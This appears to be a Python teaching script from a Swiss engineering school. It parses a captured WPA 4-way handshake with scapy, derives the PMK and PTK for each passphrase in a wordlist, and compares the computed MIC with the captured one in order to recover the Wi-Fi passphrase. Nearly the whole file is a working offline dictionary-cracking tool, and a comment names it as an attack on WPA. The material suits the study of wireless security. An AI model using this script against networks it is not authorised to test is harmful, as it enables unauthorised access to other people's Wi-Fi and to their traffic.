#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__     = "GPL"
__version__     = "1.0"
__email__               = "abraham.rubinstein@heig-vd.ch"
__status__              = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa = rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = wpa[0].info.decode("utf-8") # le beacon contient le ssid
APmac       = a2b_hex(wpa[0].addr3.replace(':','')) # il contient aussi l'adresse de l'AP
Clientmac   = a2b_hex(wpa[1].addr1.replace(':','')) # le client répond avec son adresse
hash_algo   = bytes([wpa[8].load[2:3][0] & b'\x03'[0]]) # extracting the bits that tell us the use algo (sha1 or md5)

# Authenticator and Supplicant Nonces
ANonce      = wpa[5].load[13:45] # le premier handshake contient le ANonce # a2b_hex("90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91")
SNonce      = wpa[6].load[13:45] # le second handshake contient le SNonce # a2b_hex("7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577")

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = wpa[8].load[77:93] #c'est le 4eme handshake qui contient le mic #"36eef66540fa801ceee2fea9b7929b40"

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

data        = bytes(wpa[8][EAPOL])[0:77] + b'\x00'*(len(mic_to_test)+6) #we copy until where the mic start, then pad with the length of the mix + some bytes to have only zeros at the end

ssid = str.encode(ssid)

# read wordlist line by line
with open('wordlist.txt') as fp:
    passPhrase = fp.readline()[:-1]
    found = False
    while passPhrase:
        pp = str.encode(passPhrase)
        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = pbkdf2(hashlib.sha1,pp, ssid, 4096, 32)
        # expand pmk to obtain PTK
        ptk = customPRF512(pmk,str.encode(A),B)

        # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK

        # select the hashing algo to use
        if hash_algo == b'\x02':
            algo = hashlib.sha1
        else:
            algo = hashlib.md5

        # compute mic from pass phrase
        mic = hmac.new(ptk[0:16],data,algo).digest()[:16]

        # test the computed mic with the mic from the handshake
        if mic.hex() == mic_to_test.hex():
            print("The pass phrase is : " + passPhrase)
            found = True
            break

        passPhrase = fp.readline()[:-1]
    if not found:
        print("Pass phrase not in the list.")
